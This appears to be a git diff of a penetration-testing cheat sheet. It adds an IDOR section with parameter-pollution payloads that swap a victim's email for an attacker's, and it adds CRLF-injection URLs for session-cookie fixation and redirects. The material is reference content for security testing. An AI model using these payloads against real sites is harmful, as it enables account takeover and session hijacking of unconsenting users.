@@ -30,14 +30,10 @@ Future plans:
 
 * more email gathering tools,
 * Bash one-liner to transform `people.txt` into `emails.txt`, and `emails.txt` into `usernames.txt`,
-* Subfinder and Findomain tools,
-* more vulnerability scanning examples using NSE,
 * more WordPress tools,
 * HTTP smuggling,
 * parameter pollution,
-* email injection,
 * insecure object deserialization,
-* create an ASP/ASP.NET web shell,
 * pre-shared key cracking,
 * email spoofing.
 
@@ -105,6 +101,7 @@ My other cheat sheets:
 * [subjack](#subjack)
 * [Nuclei](#Nuclei)
 * [dotdotpwn](#dotdotpwn)
+* [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)
 * [HTTP Response Splitting](#http-response-splitting)
 * [Cross-Site Scripting \(XSS\)](#cross-site-scripting-xss)
 * [SQL Injection](#sql-injection)
@@ -927,6 +924,8 @@ nmap -nv --script='ssl-heartbleed' -iL cidr.txt
 
 You can find `rockyou.txt` and `subdomains-top1mil.txt` wordlists in [SecLists](#wordlists).
 
+I prefer to use [Nuclei](#nuclei) for vulnerability scanning.
+
 ### Nikto
 
 Scan a web server:
@@ -1134,9 +1133,32 @@ Check some additional directory traversal tips at [swisskyrepo/PayloadsAllTheThi
 | -b | Break after the first vulnerability is found |
 | -C | Continue if no data was received from host |
 
+### Insecure Direct Object References (IDOR)
+
+First, try to simply change one value to another, e.g. change `victim@somedomain.com` to `attacker@somedomain.com`, or e.g. change ID `1` to `2`, etc.
+
+It is sometimes possible that ID `1` relates to admin account or admin role.
+
+Second, try parameter pollution:
+
+```fundamental
+email=victim@somedomain.com,attacker@somedomain.com
+email=victim@somedomain.com attacker@somedomain.com
+
+email=victim@somedomain.com&email=attacker@somedomain.com
+email[]=victim@somedomain.com&email[]=attacker@somedomain.com
+
+{ "email": "victim@somedomain.com,attacker@somedomain.com" }
+{ "email": "victim@somedomain.com attacker@somedomain.com" }
+
+{ "email": ["victim@somedomain.com", "attacker@somedomain.com"] }
+```
+
 ### HTTP Response Splitting
 
 Also known as CRLF injection. CRLF refers to carriage return (`ASCII 13`, `\r`) and line feed (`ASCII 10`, `\n`).
+
+When encoded, `\r` refers to `%0D` and `\n` refers to `%0A`.
 
 Fixate a session cookie:
 
@@ -1144,9 +1166,13 @@ Fixate a session cookie:
 somesite.com/redirect.asp?origin=somesite.com%0D%0ASet-Cookie:%20ASPSESSION=123456789
 ```
 
-When encoded, `\r` refers to `%0D` and `\n` refers to `%0A`.
+Redirect:
 
-Session fixation is one of many techniques used in combination with HTTP response splitting. Search the Internet for more information.
+```fundamental
+somesite.com/home.php?marketing=winter%0D%0ALocation:%20https%3A%2F%2Fgithub.com
+```
+
+Session fixation and redirection are one of many techniques used in combination with HTTP response splitting. Search the Internet for more information.
 
 ### Cross-Site Scripting (XSS)
 
